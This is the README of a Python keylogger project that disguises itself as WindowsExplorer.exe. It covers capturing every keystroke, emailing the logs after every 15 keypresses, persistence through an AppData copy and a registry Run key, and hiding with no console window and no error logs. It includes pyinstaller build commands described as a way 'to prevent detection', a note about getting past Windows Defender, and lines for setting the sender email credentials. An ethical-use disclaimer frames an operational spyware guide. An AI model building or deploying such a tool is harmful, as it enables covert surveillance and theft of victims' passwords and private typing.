# **Full Stealth Keylogger v1**  

**Project Overview**  
WindowsExplorer is a **Python-based keylogger** designed for **ethical hacking, cybersecurity research, and educational purposes**. This keylogger captures keystrokes and **sends logs via email after every 15 keypresses (customizable)** instead of relying on a time-based interval.  

Additionally, the script ensures persistence by:  
- **Moving itself** to `C:\Users\<user>\AppData\Roaming\WindowsExplorer.exe`  
- **Adding a Windows registry entry** for startup execution  
- Running **silently in the background** with no visible console  

## **Features**  

✅ **Logs Every Keystroke** – Captures user keystrokes and stores them in memory.  
✅ **Auto-Sends Keystrokes via Email** – Sends the logs after **15 key presses** (customizable).  
✅ **Persistence Mechanism** – Moves itself to the **AppData Roaming folder** and creates a **Windows registry entry** to run at startup.  
✅ **Runs in Background** – Executes **silently with no visible output**.  
✅ **Google App Password Support** – Uses a **Google App Password** to securely send emails.  

---

## **Installation & Setup**  

### **Step 1: Install Dependencies**  
Ensure you have Python installed. Then install the required library:  
```bash
pip install pynput
```

### **Step 2: Convert Script to Executable**  
To prevent detection and ensure it runs standalone, **convert the script into a Windows executable** using `pyinstaller`:  
```bash
pyinstaller --onefile --noconsole --hidden-import=pynput WindowsExplorer.py
```
- `--onefile`: Packages everything into **one standalone executable**  
- `--noconsole`: Prevents the program from opening a console window  
- `--hidden-import=pynput`: Ensures `pynput` is properly included  

After running the command, the **final executable** will be in the `dist` folder as `WindowsExplorer.exe`.  

---

## **Functionality & How It Works**  

1️⃣ **Keylogging Mechanism**  
   - Every **15 keypresses** (customizable), the keystrokes are **sent to an email**.  
   - Supports **special keys (ENTER, SPACE, BACKSPACE, etc.)**.  
   - Uses **Google App Password** for authentication.  

2️⃣ **Persistence Setup**  
   - **Moves itself to AppData Roaming**  
     ```
     C:\Users\<user>\AppData\Roaming\WindowsExplorer.exe
     ```
   - **Adds a Registry Key for Startup Execution**  
     ```registry
     HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
     ```
   - This ensures that even if the system reboots, the keylogger will **automatically start at boot**.  

3️⃣ **Stealth Mode Execution**  
   - Runs **silently in the background** without displaying any windows or messages.  
   - **No error logging** to avoid detection.  

---

## **How to Run It on a Target VM**  

1. **Transfer the `WindowsExplorer.exe` to the VM**.  
2. **Manually execute it once** (this sets up persistence although it may require a one-time windows defender exclusion). 
3. **Reboot the VM** to test if it starts automatically.  
4. The keylogger will now run **in the background at every startup**.  

---

## **Customization Options**  

Want to change the **number of keypresses before sending logs**? Modify this line in `WindowsExplorer.py`:  
```python
self.key_limit = 15  # Change this value to any number
```

To **change the email and password**, update:  
```python
self.email = "your-email@gmail.com"
self.password = "your-google-app-password"
```

---

## **Important Notes**  

- This project is for **ethical hacking, cybersecurity research, and educational purposes only**.  
- It is **recommended to test this in a controlled environment (e.g., Virtual Machine)**.  
- If **Google 2FA is enabled**, a **Google App Password** must be used instead of the normal password.  

---

## **Disclaimer**  
This tool should **only be used in environments where you have explicit permission** to do so. I am **not responsible for any misuse** of this software.  
